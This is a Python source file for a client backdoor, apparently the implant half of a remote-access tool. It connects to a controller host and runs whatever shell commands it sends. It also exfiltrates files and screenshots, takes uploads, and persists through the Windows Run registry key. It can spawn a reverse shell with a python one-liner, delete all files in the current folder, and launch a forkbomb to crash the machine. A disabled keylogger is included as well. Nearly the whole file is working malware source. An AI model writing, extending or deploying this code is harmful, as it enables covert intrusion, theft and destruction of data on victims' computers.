import socket
import subprocess
import sys
import os
import platform
import requests
import re
import pyautogui
import time


# from pynput.keyboard import Key, Listener

### Client
class Backdoor:
    keys_list = []
    count = 0
    program_name = os.path.basename(__file__)

    def __init__(self, host, port):
        # Font: Chuncky

        self.host = str(host)
        self.port = int(port)


        # print("""\033[1;36m
        # _______               __         __ __
        # |    ___|.--.--.-----.|  |.-----.|__|  |_
        # |    ___||_   _|  _  ||  ||  _  ||  |   _|
        # |_______||__.__|   __||__||_____||__|____|
        # |__|    \033[0;0m""")
        """try:
            self.host = str(input("\033[1;36mPut here the Target's IP:\033[0;0m "))  # Comment this for using direct connection
            self.port = int(input("\033[1;36mPut here the RPORT:\033[0;0m "))  # Comment this for using direct connection
            if self.host == "":
                print("\033[1;36mNo host Especified! Exiting...\033[0;0m")
                sys.exit()

        except KeyboardInterrupt:
            print("\nExiting... Bye o/")
            sys.exit()

        except:
            print("\nWrong Input! Exiting...")
            sys.exit()"""

    def commands_initiating(self):



        # Starting connection
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        connected = False
        while (connected == False):
            try:
                time.sleep(2)
                print('\033[31m[-] *\033[0;0m \033[1;36mInitiating Connection...\033[0;0m')
                self.sock.connect((self.host, self.port))
                print('\033[36m[+] *\033[0;0m \033[1;36mConnection estabilished with Sucess!\033[0;0m')
                connected = True

            except KeyboardInterrupt:
                print("\nExiting... Bye o/")
                sys.exit()

            except:
                print("\033[31m[+] * \033[0;0mHost isn't Accepting connection, Trying again...")

        # Loop getting commands

        while True:
            try:
                message_command = self.sock.recv(2048)
                message_command_descrypt = message_command.decode("latin1")

                if message_command_descrypt == "exit":
                    print("Closing RCE... Bye o/")
                    self.sock.close()
                    sys.exit()


                try:
                    not_in = ["get_ip", "permanence_mode", "upload", "victims_info", "remove_all", "keylogger_start",
                              "forkbomb", "reverse_tcp", "download", "screenshot", "cat"]

                    # Get machine's IP adress

                    if message_command_descrypt == "get_ip":
                        ip = requests.get("https://api.ipify.org").text
                        ip_message = f"The target's IP is: {ip}".encode()
                        self.sock.send(ip_message)

                    # cat command

                    if message_command_descrypt.startswith("cat "):
                        try:
                            catfile_name = message_command_descrypt.split(" ")[1]
                            cat_size = os.path.getsize(catfile_name)
                            self.sock.send(str(cat_size).encode())
                            time.sleep(2)
                            with open(catfile_name, "rb") as cat:
                                cat_read = cat.read()
                                self.sock.send(cat_read)

                        except Exception as e:
                            self.sock.send(str(e).encode())

                    if message_command_descrypt == "permanence_mode":
                        # reg.KEY_SET_VALUE
                        try:
                            if sys.platform.startswith("Windows"):
                                import winreg as reg
                                pth = os.path.dirname(os.path.realpath(__file__))
                                f_name = os.path.basename(__file__)

                                address = os.path.join(pth, f_name)

                                # Key To Change: HKEY_CURRENT_USER
                                # Key Value: Software\Microsoft\Windows\CurrentVersion\Run
                                key = reg.HKEY_CURRENT_USER
                                key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

                                # Opening Key To Make Changes
                                openn = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)

                                # Modifiy The Key
                                reg.SetValueEx(openn, "pyperm", 0, reg.REG_SZ, address)

                                # Closing
                                reg.CloseKey(openn)
                                self.sock.send("\033[1;32m[+]\033[0;0m Permanence mode activated!".encode("latin1"))

                        except Exception as exc:
                            self.sock.send(str(exc).encode())

                    if message_command_descrypt == "disable_permanence":
                        self.sock.send("\033[31m[-] *\033[0;0m Desativating permanence mode...".encode())
                        try:
                            if sys.platform.startswith("Windows"):
                                import winreg as reg
                                key = reg.OpenKey(reg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, reg.KEY_ALL_ACCESS)
                                reg.DeleteValue(key, "pyperm")
                                reg.CloseKey(key)

                        except FileNotFoundError:
                            pass

                        except Exception as e:
                            self.sock.send(str(e).encode())
                        self.sock.send("\033[1;32m[+]\033[0;0m Disabled with success".encode())
                        # except
                    # Downloading files

                    if message_command_descrypt.startswith("download "):
                        file_name = message_command_descrypt.split(" ")[1]
                        data_size = os.path.getsize(file_name)
                        self.sock.send(str(data_size).encode("utf-8"))

                        time.sleep(2)

                        with open(file_name, "rb") as sc:
                            screenshot_data = sc.read()
                            self.sock.send(screenshot_data)

                        print("Transference Done!")


                    # This is for removing all files in currently path, maybe not work in folders that requires admin credentials

                    elif message_command_descrypt == "remove_all":
                        try:
                            files = os.listdir()
                            for file in files:
                                os.chdir(os.getcwd())
                                os.remove(file)
                        except IsADirectoryError:
                            continue
                        except Exception as e:
                            self.sock.send(str(e).encode())

                    # This is used to get machine informations

                    elif message_command_descrypt == "victims_info":
                        info = f"""
                        Operacional System: {sys.platform}
                        Computer Name: {platform.node()}
                        For more advanced info, use: uname -a, uname -r, id
                        """.encode()
                        self.sock.send(info)

                    # TCP Reverse shell in python

                    if message_command_descrypt == "reverse_tcp":
                        self.sock.send("You must put IP and PORT as parameters! Ex: reverse_tcp 192.168 7777".encode())

                    if message_command_descrypt.startswith("reverse_tcp "):
                        reverseip = message_command_descrypt.split(" ")[1]
                        reverseport = message_command_descrypt.split(" ")[2]
                        subprocess.check_output(
                            f"""python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{reverseip}",{reverseport}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
                        """, stderr=subprocess.STDOUT, shell=True)
                        self.sock.send("Reverse Shell Session established with sucess!".encode())

                    # Sending Screenshot

                    if message_command_descrypt == "screenshot":
                        screenshot = pyautogui.screenshot()
                        screenshot.save("screenshot.png")

                        data_size = os.path.getsize("screenshot.png")
                        self.sock.send(str(data_size).encode("latin1"))

                        with open("screenshot.png", "rb") as sc:
                            screenshot_data = sc.read()
                            self.sock.send(screenshot_data)
                        os.remove("screenshot.png")  # para remover a imagem, testar

                    # Upload File ta executando como comando no termianl.. mudar para if, sel

                    if message_command_descrypt.startswith("upload "):

                        up_filesize = self.sock.recv(1024).decode("latin1")
                        up_filename = message_command_descrypt.split(" ")[2]

                        int_filesize = int(up_filesize)

                        up_data = b""
                        while len(up_data) < int_filesize:
                            up_data += self.sock.recv(int_filesize)

                        with open(up_filename, "wb") as up:
                            up.write(up_data)

                        self.sock.send(
                            f"\033[1;32m[+]\033[0;0m - Uploaded to {up_filename} finished! File Size: {str(int_filesize)} \n\033[1;32m[+]\033[0;0m - Going Back to Input...".encode())

                    # This is for crash the target's machine

                    if message_command_descrypt == "forkbomb":
                        try:
                            while True:
                                os.fork()
                        except Exception as e:
                            self.sock.send(str(e).encode())

                    # Verify commands
                    for value in not_in:
                        if value in message_command_descrypt:
                            message_command_descrypt = "ignoreethislittlemessage"

                    # Entering commands in terminal

                    if message_command_descrypt != "ignoreethislittlemessage":
                        command_prompt = subprocess.Popen(message_command_descrypt, stderr=subprocess.PIPE,
                                                          stdout=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
                        err = command_prompt.stderr.read()
                        command_prompt = command_prompt.stdout.read()
                        self.sock.send(command_prompt)
                        self.sock.send(err)
                        print('Command Sent!')

                        if command_prompt == b"" and err == b"":
                            self.sock.send("\nOK!\n".encode())

                        elif command_prompt == b"" and err == b"" and message_command_descrypt.startswith("cd ") == True:
                            cd_message = f"You have been moved to {os.getcwd().encode()}".encode()
                            self.sock.send(cd_message)



                except Exception as e:
                    self.sock.send(str(e).encode())

                # Navegate into directories

                if message_command_descrypt.startswith("cd"):
                    # os.chdir(message_command_descrypt[3:].replace("\n",""))
                    try:
                        os.chdir(message_command_descrypt[3:])
                        print("Command Sent!")
                    except Exception as e:
                        self.sock.send(str(e).encode())

                """if message_command_descrypt.startswith("keylogger_start "):
                    self.rang = message_command_descrypt.split(" ")[1]
                    self.listener()"""

                # if message_command_descrypt == "rm":
                # self.sock.send("You must specify a file".encode())

            except BrokenPipeError:
                print("\n\033[1;31m[!]\033[0;0m Connection Reseted! Exiting...")
                sys.exit()

            except KeyboardInterrupt:
                print("\nExiting... Bye o/")
                sys.exit()

            except ConnectionResetError:
                print("\n\033[1;31m[!]\033[0;0m Connection Reseted! Exiting...")
                sys.exit()

    """def keylogger(self, key):
        current_key = str(key)
        current_key = re.sub(r"Key.space"," ", current_key)
        current_key = re.sub(r"Key.alt_1","\n", current_key)
        current_key = re.sub(r"Key.*","", current_key)
        self.count += 1
        self.keys_list.append(current_key)
        if self.count >= int(self.rang): # Estabilish a range, with sys.argv

            with open("log.txt","w") as text:  # COUNTS THE LETTERS: IF MORE OR EQUAL TO 10, SEND MESSAGE TO SERVER
                for keys in self.keys_list:
                    text.write(keys)

            with open("log.txt","r") as text2:
                text_data = text2.read()

                keylog_ok = "OK!"
                self.sock.send(keylog_ok.encode())

                keylog_size = os.path.getsize("log.txt")
                self.sock.send(str(keylog_size).encode())

                self.sock.send(text_data.encode())
                # os.remove("log.txt")
                # sys.exit()

    def listener(self):
        with Listener(on_press = self.keylogger) as l:
            l.join()"""



back = Backdoor("127.0.0.1", 1)  # Backdoor("ip",port)
back.commands_initiating()
